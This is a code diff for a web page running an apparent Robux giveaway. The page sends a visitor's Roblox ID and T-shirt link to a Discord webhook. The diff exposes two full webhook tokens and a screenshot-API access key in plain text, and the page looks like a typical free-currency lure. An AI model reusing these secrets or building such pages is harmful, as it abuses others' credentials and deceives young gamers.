@@ -23,7 +23,7 @@
         <button id="participateButton">Participate</button>
 
         <div id="verificationStep" style="display: none;">
-            <h2>Is this you?</h2>
+            <h2>Is this you? (wait 10 sec before file loaded)</h2>
             <img id="profile-image" src="" alt="Roblox Profile Image">
             <button id="yesButton">Yes, that's me!</button>
             <button id="noButton">No, wrong ID</button>
@@ -166,7 +166,7 @@
             const userId = sessionStorage.getItem('currentUserId');
             const tshirtLink = document.getElementById('tshirtLink').value;
 
-            const webhookUrl = 'https://discord.com/api/webhooks/1375794166482731109/ap9CPfyxOh1s26wZe949QP96dpb53bynSP_8V7Aql6tagW0HW00hUPEatAurUPA3JPNg'; // yea not protected nga
+            const webhookUrl = 'https://webhook.lewisakura.moe/api/webhooks/1375801999031009481/vd7Jp0aByQintEklFwy2tQurKJFdGPF9uIKczMqwTbEOV70avbjTXKdEpK2YViaiXD8r'; // yea not protected nga
 
             const payload = {
                 "content": `🎉 Robux Giveaway Result 🎉\n\n**User ID:** ${userId}\n**Won Robux:** ${wonRobux}\n**T-Shirt Link:** ${tshirtLink}\n**Required Price:** ${requiredPrice}\n\n**Profile Image:** https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=8&response_type=image`
